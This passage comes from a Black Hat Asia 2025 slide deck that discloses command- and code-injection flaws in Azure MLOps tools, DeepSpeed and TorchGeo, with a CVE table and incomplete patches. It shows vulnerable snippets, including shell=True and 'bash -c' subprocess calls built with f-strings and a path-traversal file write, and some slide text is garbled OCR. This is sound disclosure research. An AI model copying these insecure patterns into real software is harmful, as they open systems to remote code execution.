125 model_modules = [base_module] + [
126 x[1]
127 for x in inspect.getmembers(base_module, inspect.ismodule)
128 if x[1].__file_.endswith("_init_.py") #t nore[union-attr]
129 ]
130
131 weights_enum = None
132 for m in model_modules:
133 potential_class = m.__dict__.get(enum_name, None)
134 if potential_class is not None and issubclass(potential_class, Weigt
135 weights_enum = potential class
break
138 if weights_enum is None:
raise ValueError(f"The weight enum '{enum_name}' for the specific method couldn't be retrieved.")
141 return weights_enum[value_name]
[24] https://github.com/pytorch/vision/blob/main/torchvision/models/_api.py#L108
```

## Slide 58

### Oversight #7-9: Multiple Command Injection

**azdev**

#BHAS @BlackHatEvents

[25] https://github.com/Azure/azure-cli/blob/29564830498870c401679e0059fddbbf5851f10c/src/azure-cli/azure/cli/command_modules/serviceconnector/_utils.py#L84

## Slide 59

### Oversight #7-9: Secure Cases in Codebase

**azdev**

#BHAS @BlackHatEvents

[26] https://github.com/Azure/azure-cli/pull/29798

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat Se ee >.
ASIA 2025 . 4 * ’
Oversight #7-9: Secure Cases in Codebase- wa
jsntcy commented on Aug 28 = edited ~ Member
Please use our centralized function run_cmd which is more safe instead of writing your own.
More details in https://github.com/Azure/azure-
cli/blob/282c6e8f4358934094b5 12e29ae1421438de6/aa/doc/cli_subprocess_guidelines.md#cli-centralized-subsystem-executinc
@Allyw
© od
q
Mitigating Security Vulnerability When Calling Subsystem Commands
There are several aspects of security practices that developers need to have in mindset to safeguard their cli modules from command injection
attacks.
Cli Centralized Subsystem Executing
Azure cli provides a centralized function run_cmd adapted from official subprocess.run , with necessary argument covered and illegal input
blocking enforced.
What developers need to do is:
1. from azure.cli.core.util import run_cmd
2. replace subprocess.run (Or Popen or check_call or check_output or call) with run_cmd .
3. construct cmd args as array like: [executable, arg0, arg1, arg2, ...]
[26] https://github.com/Azure/azure-cli/pull/29798
```

## Slide 60

### Coordinated Disclosure with MSRC

|Vul. / Tool@Version||MSRC
|Assessment
|Patch|
|---|---|---|---|---|
||Severity|Impact|Acknowledgement||
|AFW / Prompt Flow@1.15.0|Moderate|||promptflow
/pull/3784|
|CMD Inject / Prompt Flow@1.15.0|**Important**|**RCE**|Online Service, Sep. 2024|promptflow
/pull/3685|
|CMD Inject / Azure-CLI@2.63.0|**Important**|**LPE**|CVE-2024-43591|azure-cli/pull/29798|
|CMD Inject / AzDev@v0.1.77|**Important**|**RCE**|Online Service, Sep. 2024|azure-cli-dev-tools/pull/470|
|CMD Inject / Azure-CLI@2.64.0|Moderate||Online Service, Sep. 2024|azure-cli-
extensions/pull/7983|
|Code Inject / Azure-AI-Generative@1.0.0b8|Moderate||Online Service, Sep. 2024|azure-sdk-for-
python/pull/37297|
|Deserialization / DeepSpeed@0.15.1|Low||Online Service, Oct. 2024
(via
ProtectAI)|DeepSpeed
/pull/6547|
|CMD Inject / DeepSpeed@v0.15.1|Low||Online Service, Oct. 2024
(via
ProtectAI)||
|Code Inject / TorchGeo@v0.6.0|**Important**|**RCE**|CVE-2024-49048|torchgeo
/pull/2323|
|Code Inject / Azure-AI-Generative@1.0.0b9|**Important**|**RCE**|Online Service, Oct. 2024|azure-sdk-for-
python/pull/37678|

#BHAS @BlackHatEvents

## Slide 61

## Agenda

• The Flow for Azure MLOps

• The Tooling Suites We Focus

• The Oversights, Vulnerabilities, and Impacts

• Oversights within Coordinated Disclosure

• Countermeasure & Takeaway

#BHAS @BlackHatEvents

## Slide 62

### Patch with Oversight #1

azure-ai-generative_1.0.0b8

azure-ai-generative_1.0.0b9

Patch

#BHAS @BlackHatEvents

[26] https://github.com/Azure/azure-sdk-for-python/blob/azure-ai-generative_1.0.0b9/sdk/ai/azure-ai-generative/azure/ai/generative/synthetic/simulator/_model_tools/models.py#L276

## Slide 63

### Patch with Oversight #1

azure-ai-generative_1.0.0b8

###### azure-ai-generative_1.0.0b7

###### First report not cover

- [11] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/chat/construct_groundedness_request.py#L32 [12] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/chat/parse_groundedness_responses.py#L13

[13] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/chat/parse_service_response.py#L16-L24

[14] https://github.com/Azure/azure-sdk-for-python/blob/a61273f855bd2f3de24906a392bed20374f2c770/sdk/ai/azure-ai-generative/azure/ai/generative/evaluate/pf_templates/built_in_metrics/qa/parse_service_response.py#L15-L23

#BHAS @BlackHatEvents

## Slide 64

### Patch with Oversight #1

Training

Evaluation

Testing

Synthesis

First report not cover

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Patch with Oversight #1
en R-*A PRT
cuter IVS s rn iz < \*¥
. RY)! »/Q5°7o yp} LO
First report not cover
```

## Slide 65

### Patch with Oversight #2

azure/cli/command_modules/serviceconnector

Patched

CVE-2024-43591

azure/cli/command_modules/security **Overlooked**

#BHAS @BlackHatEvents

## Slide 66

### Patch with Oversight #3

Very Good Discussion

[27] https://github.com/microsoft/DeepSpeed/pull/6490 [28] https://github.com/microsoft/DeepSpeed/pull/6491

#BHAS @BlackHatEvents

## Slide 67

### Patch with Oversight #3

But the Patch overlooks ‘bash -c’

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Pp atch with Over sight #t 3 | dJeepspeed
a. @@ -482,7 +482,8 @@ def command_exists(self, cmd):
482 482 cmds = [cmd]
483 483 valid = False
484 484 for cmd in cmds:
485 = result = subprocess.Popen(f'type {cmd}', stdout=subprocess.PIPE, shell=True)
485 + safe_cmd =|["bash", "-c"} f"type {cmd}"]
486 + result = subprocess.Popen(safe_cmd, stdout=subprocess.PIPE)
486 487 valid = valid or result.wait
487 488
488 489 if not valid and len(cmds) > 1:
But the Patch overlooks “bash -c’
```

## Slide 68

### Patch with Oversight #3

#### Even worse …

**Command Injection comes back?**

#BHAS @BlackHatEvents

[29] https://github.com/microsoft/DeepSpeed/pull/6498

## Slide 69

## Agenda

• The Flow for Azure MLOps

• The Tooling Suites We Focus

• The Oversights, Vulnerabilities, and Impacts

• Oversights within Coordinated Disclosure

• Countermeasure & Takeaway

#BHAS @BlackHatEvents

## Slide 70

### Countermeasure: Can LLM do the Help?

**Oversight is here**

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Countermeasure: Can LLM do the Help? =) covite
2. MediaSave Resource
@ Python (Oo
1. save_image function @api.route("/media_save")
class MediaSave(Resource):
@ Python OQ @api.response(code=200, description="Save image", model=fields.String)
@api.doc(description="Save image")
@api.expect(media_save_parser)
def save_image(directory, base64_data, extension): def post(self)
image_data = base64.b64decode(base64_data)
hash_object = hashlib.sha256(image data) NX
filename = hash_object.hexdigest()
file_path = Path(directory) / f"{filename}}.{extension}"
with open(file_path, "wb") as f:
f.write(image_data) Oversight is here
return file path
args = media save _parser.parse_args()
flow = decrypt_flow_path(args. flow)
flow, _ = resolve flow_path(flow)
base64_data = args.base64_data
extension = args.extension
safe_path = safe_join(str(flow), PROMPT_FLOW_DIR_NAME)
if safe_path is None:
message = f"The untrusted path {PROMPT_FLOW_DIR_NAME} relative to the base dir
raise UserErrorexception(message)
file_path = save_image(safe_path, base64_data, extension)
path = Path(tile_path).relative_to(flow)
return str(path)
```

## Slide 71

### Countermeasure: Can LLM do the Help?

###### **Detected with false positive**

#BHAS @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2025
Countermeasure: Can LLM do the Help? =) covite
GPT-40 +
®&) To confirm whether the provided code snippet has vulnerabilities, let's break down each part and
analyze it thoroughly.
Code Analysis and Vulnerability Check
1. save_image function
@ Python Oo
def save_image(directory, base64_data, extension):
image_data = base64.b64decode(base64_data)
hash_object = hashlib.sha256(image_ data)
filename = hash_object.hexdigest()
file_path = Path(directory) / f"{filename}.{extension}"
with open(file_path, "wb") as f:
f.write(image_data)
return file_path
Potential Vulnerabilities:
¢ Base64 Data Handling: Ensure that base64_data is properly validated before decoding it.
Invalid or malicious input could lead to unexpected behavior.
¢ Path Manipulation: The directory and extension parameters should be sanitized to prevent
Detected with false positive —
directory traversal attacks or injection of malicious file extensions.
e File Permissions: Ensure that the directory “here the file is being saved has appropriate
permissions to prevent unauthorized acce Voor tampering.
```

## Slide 72

### Countermeasure: Can LLM do the Help?

**The bug is path traversal, not the injection!!!**

**safe_join is safe!**

#BHAS @BlackHatEvents

## Slide 73

### Countermeasure: Can LLM do the Help?

##### **Recommendation is too general, still need lots of human effort to do the audit!!!**

#BHAS @BlackHatEvents

## Slide 74

### Black Hat Byte Sounds

For **Open-Source Tool Maintainers** :

Apply more stricter security check for new merge requests, especially for those committed from a broader scope of ML/AI community, since the guys are more concern the functionality rather than security.

For **MSRC** :

Require more robust control to coordinate the disclosure progress, in order to avoid the potential incomplete fixes and unpatched overlooks.

For **Azure App Developers** :

When adopt tooling suites/SDKs for Azure MLOps or to build up Azure Apps, should have the vigilance to potential vulnerabilities from Azure tools to impact your Apps.

#BHAS @BlackHatEvents

## Slide 75

# Thank You

Peng Zhou (zpbrent@gmail.com) Shanghai University

#BHAS @BlackHatEvents
